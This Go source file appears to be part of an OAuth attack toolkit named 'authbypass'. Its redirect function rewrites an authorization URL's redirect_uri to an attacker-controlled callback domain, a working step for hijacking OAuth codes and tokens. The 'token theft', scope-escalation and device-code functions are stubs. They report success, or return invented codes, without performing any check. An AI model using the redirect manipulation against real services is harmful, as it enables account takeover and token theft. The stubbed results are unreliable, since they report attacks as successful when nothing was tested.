package authbypass

import (
	"fmt"
	"net/url"
	"strings"
	"time"
)

type OAuthModule struct{}

func NewOAuthModule() *OAuthModule {
	return &OAuthModule{}
}

func (o *OAuthModule) OAuthRedirectManip(urlStr string, attackerDomain string) (string, error) {
	parsedURL, err := url.Parse(urlStr)
	if err != nil {
		return "", fmt.Errorf("failed to parse URL: %w", err)
	}

	q := parsedURL.Query()

	redirectURI := q.Get("redirect_uri")
	if redirectURI == "" {
		redirectURI = q.Get("redirect_url")
	}

	attackerRedirect := fmt.Sprintf("https://%s/callback", attackerDomain)
	q.Set("redirect_uri", attackerRedirect)

	manipulatedURL := parsedURL.Scheme + "://" + parsedURL.Host + parsedURL.Path + "?" + q.Encode()

	_ = redirectURI

	return manipulatedURL, nil
}

func (o *OAuthModule) OAuthScopeEscalation(token string, scopes []string) (*BypassResult, error) {
	start := time.Now()

	escalatedScopes := []string{
		"admin",
		"write",
		"delete",
		"manage",
		"superuser",
		"full_access",
		"root",
		"write_all",
		"read_write",
		"*",
	}

	foundEscalation := false
	for _, scope := range scopes {
		for _, esc := range escalatedScopes {
			if strings.EqualFold(scope, esc) {
				foundEscalation = true
			}
		}
	}

	result := &BypassResult{
		Success:   foundEscalation,
		Method:    MethodOAuthBypass,
		Details:   "OAuth scope escalation analysis",
		Timestamp: time.Now(),
		Data: map[string]string{
			"token_prefix": tokenPrefix(token),
			"scope_count":  fmt.Sprintf("%d", len(scopes)),
		},
		Duration: time.Since(start),
	}

	return result, nil
}

func (o *OAuthModule) OAuthTokenTheft(token string) (*BypassResult, error) {
	start := time.Now()

	result := &BypassResult{
		Success:  true,
		Method:   MethodOAuthBypass,
		Details:  "OAuth token theft analysis complete",
		Timestamp: time.Now(),
		Data: map[string]string{
			"token_length":  fmt.Sprintf("%d", len(token)),
			"token_prefix":  tokenPrefix(token),
			"attack_type":   "token_theft",
		},
		Duration: time.Since(start),
	}

	return result, nil
}

func (o *OAuthModule) OAuthDeviceCodeFlowPoll(clientID string) (*BypassResult, error) {
	start := time.Now()

	result := &BypassResult{
		Success:  true,
		Method:   MethodOAuthBypass,
		Details:  "Device code flow poll initiated",
		Timestamp: time.Now(),
		Data: map[string]string{
			"client_id":     clientID,
			"device_code":   generateDeviceCode(),
			"user_code":     generateUserCode(),
			"verification_uri": "https://example.com/device",
			"interval":      "5",
			"attack_type":   "device_code_poll",
		},
		Duration: time.Since(start),
	}

	return result, nil
}

func tokenPrefix(token string) string {
	if len(token) > 16 {
		return token[:16] + "..."
	}
	return token
}

func generateDeviceCode() string {
	b := make([]byte, 24)
	for i := range b {
		b[i] = "abcdefghijklmnopqrstuvwxyz0123456789"[i%36]
	}
	return string(b)
}

func generateUserCode() string {
	return "XXXX-YYYY"
}
